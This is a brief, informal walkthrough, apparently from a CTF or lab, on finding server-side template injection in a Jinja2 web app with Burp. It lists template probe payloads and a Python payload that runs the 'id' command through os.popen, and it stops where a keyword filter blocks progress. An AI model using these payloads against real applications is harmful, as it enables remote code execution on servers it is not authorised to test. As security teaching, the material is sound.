First we'll burp the request and look for a plave where we can inject the payload.

Alright, now we have find payloads that we can use.

These are the payloads we gonna use to find if the website is vulnerable. we can use burp's intruder for this.

{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}

{{7*7}} seems to be working for us. we recieve 49 as the response, so it evaluates the numbers.

{{7*'7'}} gives us 7777777, this confirms that this is Jinja2.

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}

we can use this payload.

Keywords are being filtered.

Now we have to bruteforce to find how we can bypass this filter.
